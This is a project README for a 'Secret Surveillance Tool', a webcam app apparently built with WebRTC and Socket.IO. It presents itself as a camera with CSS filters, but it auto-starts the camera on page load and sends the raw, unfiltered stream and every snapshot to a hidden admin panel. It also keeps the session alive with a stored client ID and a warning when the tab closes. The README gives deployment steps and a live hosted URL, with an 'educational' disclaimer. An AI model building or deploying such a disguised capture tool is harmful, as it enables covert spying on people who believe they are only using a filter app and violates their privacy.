##Secret Surveillance Tool
Disclaimer: This project is a spying tool developed strictly for educational purposes to demonstrate concepts in ethical hacking and cybersecurity. The creator, Mrinal, developed this as a brainstormed idea to take baby steps in learning ethical hacking and cybersecurity. The creator is not liable for any misuse of this tool. Users are responsible for ensuring compliance with all applicable laws and ethical guidelines. Unauthorized use for malicious purposes is strictly prohibited.
Overview
The Secret Surveillance Tool is a web-based application that allows a client to stream live video with CSS-based filters (e.g., black and white, blur, sunny) and capture snapshots, which are sent to an admin panel. The admin panel can view the raw (unfiltered) stream, receive snapshots, and control the client’s camera (start/stop). The tool uses WebRTC for real-time streaming, Socket.IO for signaling, and Express.js for serving the application. It is hosted on Render (https://secret-404e.onrender.com) and designed for educational exploration of real-time video streaming and client-server communication.
Features

Client Interface (/client-app/):
Auto-starts camera on page load using getUserMedia.
Applies CSS filters to the video stream (Black & White, Blur, Sunny, Contrast, Invert, Hue Rotate, Sepia, Opacity, Saturate, Dreamy).
Captures snapshots with applied filters, downloadable locally (e.g., snapshot_2025-07-19T20-58-00.png) and sent to the admin panel.
Persists stream with a unique clientId until the admin sends a stop-camera command.
Warns users on tab closure to prevent accidental stream termination.


Admin Panel (/admin-panel/):
Displays raw (unfiltered) WebRTC stream from the client.
Receives snapshots with applied filters.
Allows stopping the client’s camera via a stop-camera command.


Server:
Handles WebRTC signaling (offer, answer, ice-candidate) via Socket.IO.
Maintains client sessions using clientId for reconnection after tab closure.
Serves static files (client-app/index.html, admin-panel/admin.html).


Educational Purpose:
Demonstrates WebRTC, Socket.IO, and CSS filter applications in a controlled environment.
Serves as a learning tool for ethical hacking and cybersecurity concepts, such as client-server communication and real-time surveillance.



Project Structure
/secret
├── server.js          # Express.js server with Socket.IO for WebRTC signaling
├── client-app/
│   └── index.html     # Client interface with video stream and CSS filters
├── admin-panel/
│   └── admin.html     # Admin interface for viewing stream and snapshots
└── README.md          # Project documentation

Prerequisites

Node.js: v14 or higher (for server.js).
npm: For installing dependencies.
Git: For cloning the repository.
Render Account: For deployment (free tier or Starter plan recommended).
Browser: Chrome or Firefox (for WebRTC and CSS filter support).
Webcam and Microphone: For client-side streaming.

Installation

Clone the Repository:
git clone https://github.com/mrinal140420/secret.git
cd secret


Install Dependencies:
npm install express socket.io


Run Locally:
node server.js


Access client: http://localhost:3000/client-app/
Access admin: http://localhost:3000/admin-panel/



Deployment on Render

Create Render Web Service:

Sign in to https://dashboard.render.com.
Create a new Web Service, selecting your GitHub repository (mrinal140420/secret).
Set:
Environment: Node
Build Command: npm install
Start Command: node server.js


Use free tier or Starter plan (~$7/month) for persistent uptime.


Verify Directory Structure:

Ensure server.js, client-app/index.html, and admin-panel/admin.html are in the repository root as shown above.


Push Changes:
git add server.js client-app/index.html admin-panel/admin.html
git commit -m "Deploy surveillance tool"
git push origin main


Check Deployment:

Visit https://secret-404e.onrender.com/client-app/ for the client.
Visit https://secret-404e.onrender.com/admin-panel/ for the admin.
Check Render logs for errors or successful deployment.



Usage
Client Interface (https://secret-404e.onrender.com/client-app/)

Access:
Open the URL in Chrome/Firefox.
Grant camera and microphone permissions.


Apply Filters:
Click buttons (Black & White, Blur, Sunny, Contrast, Invert, Hue Rotate, Sepia, Opacity, Saturate, Dreamy) to apply CSS filters to the video.
Select “No Filter” to revert to raw video.


Take Snapshots:
Click “Take Photo” to capture a snapshot with the current filter.
Snapshot downloads locally (e.g., snapshot_2025-07-19T20-58-00.png) and is sent to the admin panel.


Stop Camera:
Click “Stop Camera” to stop the stream locally (admin can also stop it).


Persistence:
Closing the tab prompts a warning.
Reopening resumes the stream with the same clientId until the admin sends stop-camera.



Admin Panel (https://secret-404e.onrender.com/admin-panel/)

View Stream:
Open the URL to see the raw (unfiltered) client stream via WebRTC.


Receive Snapshots:
Snapshots with applied filters appear in the #snapshots container.


Control Client:
Send stop-camera with the client’s clientId to stop their stream.
Example (React-based):const stopCamera = (clientId) => {
  socket.emit('stop-camera', clientId);
};





Server (server.js)

Runs on port 3000 (or process.env.PORT on Render).
Handles WebRTC signaling and client session persistence.
Serves client-app/ and admin-panel/ static files.
Logs events for debugging (e.g., Client registered, Forwarding offer).

Technical Details

Client (index.html):
Uses navigator.mediaDevices.getUserMedia for video/audio capture (640x480 resolution).
Applies CSS filters via filter property (e.g., grayscale(100%), blur(5px)).
Captures snapshots using a temporary <canvas> to preserve filters.
Persists clientId in localStorage for session reconnection.
Sends WebRTC offer and ice-candidate via Socket.IO.


Server (server.js):
Uses Express.js to serve static files.
Socket.IO handles WebRTC signaling (offer, answer, ice-candidate) and events (snapshot, stop-camera).
Stores client sessions in a Map for persistence until stop-camera.


Admin (admin.html):
React-based interface (assumed).
Receives raw WebRTC stream and filtered snapshots.
Sends stop-camera to control clients.


Dependencies:
Express.js: Web server.
Socket.IO: Real-time communication.
WebRTC: Peer-to-peer streaming.
No external libraries for filters (pure CSS).



CSS Filters
The client interface supports the following filters:

Black & White: filter: grayscale(100%)
Blur: filter: blur(5px)
Sunny: filter: brightness(1.5) saturate(1.5)
Contrast: filter: contrast(150%)
Invert: filter: invert(100%)
Hue Rotate: filter: hue-rotate(180deg)
Sepia: filter: sepia(100%)
Opacity: filter: opacity(50%)
Saturate: filter: saturate(200%)
Dreamy: filter: blur(3px) grayscale(50%) brightness(1.2)

Educational Purpose
This project was created to explore:

WebRTC: Real-time video streaming between client and admin.
Socket.IO: Signaling for WebRTC and event handling.
CSS Filters: Client-side video manipulation.
Session Persistence: Maintaining connections using clientId.
Cybersecurity Concepts: Understanding surveillance mechanisms and their ethical implications.

Intended Use: For learning ethical hacking and cybersecurity through a controlled, educational project. The creator encourages responsible use and adherence to legal and ethical standards.
Troubleshooting

“Cannot GET /client-app”:
Cause: Incorrect express.static or missing index.html.
Fix:
Verify client-app/index.html exists.
Check Render logs for ENOENT errors.
Test locally: node server.js, then http://localhost:3000/client-app/.




Live Stream Not Working:
Cause: WebRTC signaling or camera access issue.
Fix:
Check client console for getUserMedia errors (e.g., Permission denied).
Ensure HTTPS on Render (http:// blocks getUserMedia).
Verify server logs for offer, answer, ice-candidate.
Add debug in index.html:peerConnection.oniceconnectionstatechange = () => {
  console.log('ICE state:', peerConnection.iceConnectionState);
};






Admin Panel No Stream/Snapshots:
Cause: Admin not registered or WebRTC setup issue.
Fix:
Ensure admin.html emits socket.emit('register', 'admin').
Verify WebRTC setup (see Admin Panel section).
Check server logs for Admin registered, Forwarding snapshot.




Filters Not Applied:
Fix: Inspect <video> for correct class (e.g., class="grayscale"). Test in Chrome/Firefox.


Snapshots Incorrect:
Fix: Log currentFilter in takePhoto:console.log('Snapshot filter:', currentFilter);





Limitations

Browser Close: Stream stops when the browser closes (WebRTC requires an active tab). Reopening resumes with clientId.
Render Free Tier: May spin down after inactivity. Use Starter plan (~$7/month) for uptime.
Camera Access: Requires user permission; may fail if blocked.

Contributing
Contributions are welcome for educational enhancements. Please:

Fork the repository.
Create a feature branch (git checkout -b feature/xyz).
Commit changes (git commit -m 'Add feature xyz').
Push to the branch (git push origin feature/xyz).
Open a pull request.

License
This project is for educational purposes only. No formal license is provided, as it is intended for learning and not for commercial or malicious use. The creator is not liable for any misuse.
Contact
For issues or suggestions, open an issue on GitHub or contact the creator via GitHub (mrinal140420).
Reminder: Use this tool responsibly and ethically, respecting all applicable laws and privacy regulations.
